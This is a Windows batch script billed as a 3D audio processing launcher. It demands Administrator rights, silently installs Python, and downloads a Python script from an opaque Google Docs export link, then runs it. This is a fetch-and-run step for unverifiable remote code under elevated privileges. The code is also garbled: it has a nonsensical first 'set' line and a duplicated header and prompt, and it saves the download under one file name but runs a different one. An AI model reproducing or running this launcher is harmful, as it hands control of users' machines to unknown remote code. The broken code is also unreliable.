@echo off
REM ========================================
REM 3D Audio Processing Launcher (Windows)
REM ========================================
set pa1112.py=%PY_SCRIPT%
REM --- Check for admin rights ---
net session >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo Please run this script as Administrator!
    pause
    exit /b 1
)

REM --- Prompt for WAV file URL or local path ---
set /p MUSIC_INPUT="Enter full path to WAV file or URL: "

REM --- Function to detect Python ---
set PYTHON_EXE=

for %%P in (
    "%ProgramFiles%\Python312\python.exe"
    "%LocalAppData%\Programs\Python\Python312\python.exe"
    "%ProgramFiles%\Python311\python.exe"
    "%LocalAppData%\Programs\Python\Python311\python.exe"
) do (
    if exist "%%P" set PYTHON_EXE=%%P
)

REM --- Install Python if not found ---
IF "%PYTHON_EXE%"=="" (
    echo Python not found! Installing Python 3.12...
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe' -OutFile 'python_installer.exe'"
    start /wait python_installer.exe /quiet InstallAllUsers=1 PrependPath=1
    del python_installer.exe

    REM Try detecting Python again
    for %%P in (
        "%ProgramFiles%\Python312\python.exe"
        "%LocalAppData%\Programs\Python\Python312\python.exe"
    ) do (
        if exist "%%P" set PYTHON_EXE=%%P
    )

    IF "%PYTHON_EXE%"=="" (
        echo Python installation almost done! Re-run this script, and if it starts trying to install again...install manually
        pause
        exit /b 1
    )
    echo Python installed successfully.
)

REM --- Ensure pip is upgraded ---
"%PYTHON_EXE%" -m ensurepip
"%PYTHON_EXE%" -m pip install --upgrade pip

REM --- Install required Python dependencies ---
"%PYTHON_EXE%" -m pip install numpy scipy pydub
@echo off
setlocal enabledelayedexpansion

:: --- Music input ---
set /p MUSIC_INPUT=Enter full path to WAV file or URL: 

:: Check if it starts with http
echo %MUSIC_INPUT% | findstr /b /i "http" >nul
if %errorlevel%==0 (
    set "MUSIC_FILE=music_input.wav"
    echo Downloading WAV file...
    powershell -Command "Invoke-WebRequest -Uri '%MUSIC_INPUT%' -OutFile '%MUSIC_FILE%'"
    if not exist "%MUSIC_FILE%" (
        echo Failed to download WAV file
        exit /b 1
    )
) else (
    set "MUSIC_FILE=%MUSIC_INPUT%"
    if not exist "%MUSIC_FILE%" (
        echo WAV file not found: %MUSIC_FILE%
        exit /b 1
    )
)

:: --- Video input (optional) ---
set /p VIDEO_INPUT=Enter full path to video file or URL (optional, press enter to skip): 

if not "%VIDEO_INPUT%"=="" (
    echo %VIDEO_INPUT% | findstr /b /i "http" >nul
    if %errorlevel%==0 (
        set "VIDEO_FILE=input_video.mp4"
        echo Downloading video file...
        powershell -Command "Invoke-WebRequest -Uri '%VIDEO_INPUT%' -OutFile '%VIDEO_FILE%'"
        if not exist "%VIDEO_FILE%" (
            echo Failed to download video file
            exit /b 1
        )
    ) else (
        set "VIDEO_FILE=%VIDEO_INPUT%"
        if not exist "%VIDEO_FILE%" (
            echo Video file not found: %VIDEO_FILE%
            exit /b 1
        )
    )
) else (
    set "VIDEO_FILE="
)

echo.
echo ✅ Music file: %MUSIC_FILE%
if not "%VIDEO_FILE%"=="" (
    echo ✅ Video file: %VIDEO_FILE%
) else (
    echo ⚠️ No video file provided; will only generate audio.
)

REM --- Check if Python script exists, if not download ---
set PY_SCRIPT=PYTHONSCRIPT.py
IF NOT EXIST "%PY_SCRIPT%" (
    echo Python script not found, downloading...
    powershell -Command "Invoke-WebRequest -Uri 'https://doc-0o-bg-docstext.googleusercontent.com/export/9ki07gn521c2tv3m4j64iib8f4/q710ta1lfshjkq5sa7dss49sl4/1757403475000/113176530761290358192/113176530761290358192/1gp5Km9Omzfst9zR1fduEgjUifO2VqivBHZaZIPwki-Y?format=docx&dat=AOBvIb3GcPk-JseTSHw1RNcbie37tWkMpniyy6Phhvj4LIuyi-q6viYWuXhaJFqt9nPIjkhpvik_Y6WoK6PvF-Kovg93unJh_xGPo-8ssEzmuzEF2Kin-nLxDl6LmPC64t2VswtH9M5_iBubW_pKAMlEchIOcfnYz7Kef7sxhs_PmYueV1d8FQCZhIW1hVaX9BZPV5wBKNkic9MsqLaY5i581pwR8V8t8RZOR-F_QCAxf1oEW-J-TN8HmY5s7xJFUPdnV1rl5T3wQ8F6q-iTxuyM2Hb2kjo9CgNY1Fn6prDo86DZ4U4qltm_iUHxvcMbSpw-wjOMJQAaGWEmovrjB9X3mcg7asfgkhxgGBqlJcrxDNLwUFlCEz5c48kxEi_DpwVwtJMQIp-slOAvOKWbakFAEWIymePv2nQ4bZzR8uHWwLCeuw410AF2HYBSoh0b2lSBSHgnCw9qmUDf9i7oGVAY-Mt83lsWM-8W11qN2qgESZjMKp6Bi15AfKu1XyNxvcUsiC34Zyy9G8rUBt6IBNxoFtoFLOH2RghUwyMD74Y6WDBifv3AVuRjct69UuBCZdgm_JXg9ccCRiGbveUFtDIlfRqeAgn9QmlgeGVrXGDApSjK3DEQcsxU9uxtHyufU2c5pM2Xrygz6_ACGR0XUcQ00_YVh7TJ7HJ-vE5YRJMvulD80ml8gGCSY4DgTo4LVPQzKCZWFHlVijx_YFSgEQNFfz30LHQ2Uw9FbaqSkJ6Mgct9EusTX30c6ZMyGV7DNZlFWCeaUN07EchAIJfN381R-KNODaWdwjcrlH8itxo6h2I438icBclXUK-xK9D8T2npWRhepE-X1vLU-a9MlcwrW-n0_PGLCiO4BUp2iGlOFNtjnkXjlK9Ls3X3moOS--Q7Ep3xkTqKzkfXFEyic9G3vnsUd8Ei' -OutFile 'pa1112.py'"
    IF %ERRORLEVEL% NEQ 0 (
        echo Failed to download Python script.
        pause
        exit /b 1
    )
)

REM --- Run Python script ---
echo Running 3D audio processing...
"%PYTHON_EXE%" "%PY_SCRIPT%" --music_url "%MUSIC_FILE%"

echo Done.
pause
